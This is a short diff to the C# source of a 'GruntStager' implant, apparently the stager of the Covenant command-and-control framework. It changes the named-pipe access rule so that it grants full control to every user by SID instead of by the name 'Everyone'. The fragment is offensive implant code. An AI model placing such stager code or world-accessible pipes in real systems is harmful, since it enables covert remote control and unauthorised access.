@@ -8,6 +8,8 @@ using System.IO.Pipes;
 using System.IO.Compression;
 using System.Reflection;
 using System.Collections.Generic;
+using System.Security.Principal;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 
 namespace GruntStager
@@ -57,7 +59,7 @@ namespace GruntStager
                 NamedPipeServerStream pipe = null;
                 string Stage0Response = "";
                 PipeSecurity ps = new PipeSecurity();
-                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                 pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 pipe.WaitForConnection();
                 System.Threading.Thread.Sleep(5000);
